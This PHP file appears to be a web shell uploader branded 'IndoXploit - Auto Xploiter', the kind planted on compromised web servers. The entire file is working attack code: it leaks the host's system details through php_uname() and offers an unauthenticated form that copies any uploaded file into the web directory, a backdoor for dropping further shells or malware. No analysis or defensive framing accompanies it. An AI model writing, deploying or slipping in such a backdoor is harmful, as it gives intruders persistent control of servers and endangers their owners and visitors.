<?php
echo "IndoXploit - Auto Xploiter";
echo "<br>".php_uname()."<br>";
echo "<form method='post' enctype='multipart/form-data'>
<input type='file' name='idx'><input type='submit' name='upload' value='upload'>
</form>";
if($_POST['upload']) {
	if(@copy($_FILES['idx']['tmp_name'], $_FILES['idx']['name'])) {
	echo "sukses";
	} else {
	echo "gagal";
	}
}
?>